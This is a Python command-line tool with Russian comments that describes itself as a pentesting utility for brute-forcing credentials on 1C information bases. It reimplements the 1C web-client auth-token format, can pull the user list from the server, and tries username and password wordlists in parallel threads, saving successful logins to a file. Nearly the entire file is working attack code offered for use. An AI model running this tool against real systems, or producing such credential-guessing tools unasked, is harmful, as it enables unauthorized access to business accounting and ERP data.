import base64
import hashlib
import zlib
import struct
import requests
import re
import argparse
import os
import logging
import sys
import secrets
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Настройка логирования
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# Фиксированный IV для AES (используется для совместимости с 1С; для критичных применений генерируйте случайный IV)
FIXED_IV = bytes([157, 123, 154, 32, 105, 101, 187, 40, 6, 122, 72, 61, 178, 108, 113, 142])

# Переопределение обработчика исключений для корректного завершения работы при Ctrl+C
_original_excepthook = sys.excepthook
def custom_excepthook(exctype, value, traceback):
    if exctype == KeyboardInterrupt:
        logging.info("Выход...")
    else:
        _original_excepthook(exctype, value, traceback)
sys.excepthook = custom_excepthook

# ----------------------- Криптографические функции -----------------------
def sha1_base64(input_str: str) -> bytes:
    """
    Возвращает base64-кодированный SHA1-хеш от входной строки.
    """
    sha1_digest = hashlib.sha1(input_str.encode()).digest()
    return base64.b64encode(sha1_digest)

def sha256_digest(data: bytes) -> bytes:
    """
    Возвращает SHA256-хеш от входных данных.
    """
    return hashlib.sha256(data).digest()

def generate_auth_token(password: str, username: str) -> str:
    """
    Генерирует токен аутентификации для 1С информационной базы.
    
    Алгоритм:
      1. Генерируется первый блок: 32 байта случайных данных шифруются AES-CBC с ключом, 
         полученным как sha256(sha1_base64(password)).
      2. Генерируется второй блок: ещё 32 байта случайных данных шифруются AES-CBC с ключом, 
         полученным как sha256(sha1_base64(password.upper())).
      3. Добавляется имя пользователя с указанием его длины (4 байта, little-endian).
      4. Вычисляется CRC32 для сформированного набора байт и добавляется (4 байта, little-endian).
      5. Итоговый набор байт кодируется в base64 и возвращается.
    """
    token_bytes = bytearray()
    
    # Идентификатор версии токена
    token_bytes.append(1)
    
    # Первый блок шифрования
    random_block1 = secrets.token_bytes(32)
    key1 = sha256_digest(sha1_base64(password))
    cipher1 = AES.new(key1, AES.MODE_CBC, iv=FIXED_IV)
    encrypted_block1 = cipher1.encrypt(pad(random_block1, AES.block_size))
    token_bytes.append(len(encrypted_block1))
    token_bytes.extend(encrypted_block1)
    
    # Второй блок шифрования
    random_block2 = secrets.token_bytes(32)
    key2 = sha256_digest(sha1_base64(password.upper()))
    cipher2 = AES.new(key2, AES.MODE_CBC, iv=FIXED_IV)
    encrypted_block2 = cipher2.encrypt(pad(random_block2, AES.block_size))
    token_bytes.append(len(encrypted_block2))
    token_bytes.extend(encrypted_block2)
    
    # Добавление имени пользователя (4 байта длины + имя)
    username_bytes = username.encode()
    token_bytes.extend(struct.pack("<I", len(username_bytes)))
    token_bytes.extend(username_bytes)
    
    # Вычисление и добавление CRC32
    checksum = zlib.crc32(token_bytes)
    token_bytes.extend(struct.pack("<I", checksum))
    
    return base64.b64encode(token_bytes).decode()

# ----------------------- Функции для HTTP-запросов -----------------------
def get_session(timeout: float, proxy: str = None, retries: int = 3) -> requests.Session:
    """
    Создает requests.Session с настройками таймаута, повторных попыток и поддержки прокси.
    """
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    # Таймаут будет указываться при каждом запросе
    session.request_timeout = timeout
    return session

def get_version(session: requests.Session, url: str) -> str:
    """
    Получает версию 1С информационной базы по указанному URL.
    """
    try:
        response = session.get(f"{url}/", timeout=session.request_timeout)
        response.raise_for_status()
    except Exception as e:
        logging.error(f"Ошибка при получении версии: {e}")
        return ""
    
    match = re.search(r'(?<=var VERSION = ")[0-9\.]+', response.text)
    if match:
        return match.group(0)
    else:
        logging.error("Не удалось определить версию из ответа сервера.")
        return ""

def authenticate(session: requests.Session, url: str, version: str, credentials: str) -> bool:
    """
    Пытается аутентифицироваться на сервере, используя переданный токен.
    """
    data = {"cred": credentials}
    try:
        response = session.post(f"{url}/e1cib/login?version={version}", json=data, timeout=session.request_timeout)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"Ошибка при аутентификации: {e}")
        return False

def fetch_users(session: requests.Session, url: str) -> list:
    """
    Получает список пользователей из информационной базы.
    """
    try:
        response = session.get(f"{url}/e1cib/users", timeout=session.request_timeout)
        response.raise_for_status()
    except Exception as e:
        logging.error(f"Не удалось получить список пользователей: {e}")
        return []
    return [user.strip() for user in response.text.split("\r\n") if user.strip()]

def check_credentials(session: requests.Session, username: str, password: str, url: str, version: str, dry_run: bool = False) -> dict:
    """
    Проверяет, действительны ли переданные имя пользователя и пароль.
    Возвращает словарь с результатом проверки.
    """
    result = {"username": username, "password": password, "success": False}
    if dry_run:
        logging.info(f"Dry-run: проверка {username}:{password}")
        return result

    token = generate_auth_token(password, username)
    if authenticate(session, url, version, token):
        logging.info(f"[+] Успешная аутентификация! Пользователь: {username}, Пароль: {password}")
        result["success"] = True
    return result

# ----------------------- Функции загрузки данных -----------------------
def load_users(args, url: str, session: requests.Session) -> list:
    """
    Загружает пользователей из аргументов командной строки, файла или через запрос к серверу.
    """
    users = []
    if args.user:
        users.append(args.user)
    if args.users:
        if os.path.exists(args.users):
            try:
                with open(args.users, encoding="utf-8") as f:
                    file_users = [line.strip() for line in f if line.strip()]
                    users.extend(file_users)
            except Exception as e:
                logging.error(f"Ошибка чтения файла с пользователями {args.users}: {e}")
        else:
            logging.warning(f"Файл с пользователями {args.users} не существует!")
    if args.get:
        fetched_users = fetch_users(session, url)
        if fetched_users:
            users.extend(fetched_users)
    users = list(set(users))
    users.sort()
    return users

def load_passwords(args) -> list:
    """
    Загружает пароли из аргументов командной строки или файла.
    """
    passwords = []
    if args.password:
        passwords.append(args.password)
    if args.passwords:
        if os.path.exists(args.passwords):
            try:
                with open(args.passwords, encoding="utf-8") as f:
                    file_passwords = [line.strip() for line in f if line.strip()]
                    passwords.extend(file_passwords)
            except Exception as e:
                logging.error(f"Ошибка чтения файла с паролями {args.passwords}: {e}")
        else:
            logging.warning(f"Файл с паролями {args.passwords} не существует!")
    return passwords

def load_config(config_file: str) -> dict:
    """
    Загружает конфигурацию из JSON файла.
    """
    try:
        with open(config_file, encoding="utf-8") as f:
            config = json.load(f)
            logging.info(f"Загружена конфигурация из {config_file}")
            return config
    except Exception as e:
        logging.error(f"Ошибка чтения конфигурационного файла {config_file}: {e}")
        return {}

# ----------------------- Тестовые функции -----------------------
def test_generate_auth_token():
    token = generate_auth_token("password123", "testuser")
    print("Сгенерированный токен:", token)

def test_check_credentials_dry_run():
    # Создаем dummy-сессию с необходимым атрибутом
    class DummySession:
        request_timeout = 5.0
    dummy_session = DummySession()
    result = check_credentials(dummy_session, "testuser", "password123", "http://dummy", "1.0", dry_run=True)
    print("Результат dry-run проверки:", result)

def run_tests():
    print("Запуск тестов...")
    test_generate_auth_token()
    test_check_credentials_dry_run()
    print("Тесты завершены.")

# ----------------------- Основная функция -----------------------
def main():
    parser = argparse.ArgumentParser(
        description="Пентестерский инструмент для перебора учетных данных 1С информационной базы."
    )
    parser.add_argument("url", nargs="?", help="URL 1С информационной базы")
    parser.add_argument("-u", dest="user", help="Имя пользователя для проверки пароля")
    parser.add_argument("-U", dest="users", help="Файл со списком пользователей")
    parser.add_argument("-p", dest="password", help="Пароль для перебора")
    parser.add_argument("-P", dest="passwords", help="Файл со списком паролей")
    parser.add_argument("-l", dest="get", action="store_true", default=False,
                        help="Получить список пользователей из информационной базы")
    parser.add_argument("-o", dest="output", help="Файл для сохранения результатов (JSON)")
    parser.add_argument("-c", "--config", dest="config", help="Конфигурационный файл (JSON)")
    parser.add_argument("--timeout", type=float, default=5.0, help="Таймаут HTTP-запросов (сек)")
    parser.add_argument("--threads", type=int, default=4, help="Количество потоков для параллельной проверки")
    parser.add_argument("--proxy", help="Прокси-сервер (например, http://127.0.0.1:8080)")
    parser.add_argument("--dry-run", action="store_true", default=False, help="Только вывод проверяемых комбинаций (без запросов)")
    parser.add_argument("--run-tests", action="store_true", default=False, help="Запустить тесты функций")
    args = parser.parse_args()

    # Если включен режим тестирования, запускаем тесты и выходим
    if args.run_tests:
        run_tests()
        sys.exit(0)

    # Если указан конфигурационный файл, загружаем и обновляем параметры
    config = {}
    if args.config:
        config = load_config(args.config)
    # Функция для получения значения: сначала командная строка, потом конфиг
    def get_param(param_name, arg_value):
        return arg_value if arg_value is not None else config.get(param_name)
    
    url = get_param("url", args.url)
    if not url or not url.startswith("http"):
        logging.critical(f"{url} не является корректным URL!")
        sys.exit(1)
    
    timeout = get_param("timeout", args.timeout)
    threads = get_param("threads", args.threads)
    proxy = get_param("proxy", args.proxy)
    dry_run = args.dry_run or config.get("dry_run", False)
    
    # Создаем сессию HTTP с повторными попытками, таймаутом и поддержкой прокси
    session = get_session(timeout, proxy)
    
    # Получаем версию информационной базы
    version = get_version(session, url)
    if not version:
        logging.error(f"Не удалось определить версию! URL: {url}")
        sys.exit(1)
    logging.info(f"Версия: {version}")
    
    # Загружаем пользователей и пароли
    users = load_users(args, url, session)
    if not users:
        logging.critical("Пользователи не загружены!")
        sys.exit(1)
    passwords = load_passwords(args)
    if not passwords:
        logging.critical("Пароли не загружены!")
        sys.exit(1)
    
    # Формируем список комбинаций для проверки
    tasks = []
    for password in passwords:
        for username in users:
            tasks.append((username, password))
    
    successful_attempts = []
    total_tasks = len(tasks)
    logging.info(f"Начало проверки {total_tasks} комбинаций с использованием {threads} потоков...")

    # Параллельная проверка
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_combo = {
            executor.submit(check_credentials, session, username, password, url, version, dry_run): (username, password)
            for username, password in tasks
        }
        for future in as_completed(future_to_combo):
            username, password = future_to_combo[future]
            try:
                result = future.result()
                if result.get("success"):
                    successful_attempts.append(result)
            except Exception as e:
                logging.error(f"Ошибка проверки {username}:{password} - {e}")
    
    logging.info(f"Проверка завершена. Успешных попыток: {len(successful_attempts)}")
    
    # Если указан файл для сохранения результатов, сохраняем их в формате JSON
    if args.output and successful_attempts:
        try:
            with open(args.output, "w", encoding="utf-8") as out_file:
                json.dump(successful_attempts, out_file, ensure_ascii=False, indent=4)
            logging.info(f"Результаты сохранены в {args.output}")
        except Exception as e:
            logging.error(f"Ошибка сохранения результатов в {args.output}: {e}")

if __name__ == "__main__":
    main()
